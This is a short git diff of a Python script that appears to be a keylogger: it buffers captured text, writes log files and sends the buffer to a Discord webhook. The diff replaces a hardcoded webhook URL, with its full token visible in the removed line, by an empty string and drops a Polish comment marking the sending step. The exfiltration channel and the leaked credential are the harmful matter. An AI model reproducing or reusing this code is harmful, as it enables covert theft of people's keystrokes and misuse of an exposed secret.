@@ -6,7 +6,7 @@ LOG_FILE = "log.txt"
 SEND_FILE = "sent_log.txt"
 
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1389203274636202134/kV606ux_3rtP5bbgBH3dshcmIDnysc5bVkysSC9v725QAThSg-lkG7NaoUzqCN-03l0p"
+WEBHOOK_URL = ""
 buffer = []
 
 def send_to_discord(message):
@@ -31,7 +31,7 @@ def send_buffer():
     message = ''.join(buffer).strip()
     if message:
         print(f"Sending: {message}")
-        send_to_discord(message)  # ← tu faktyczna wysyłka
+        send_to_discord(message)  
     buffer = []
             
         
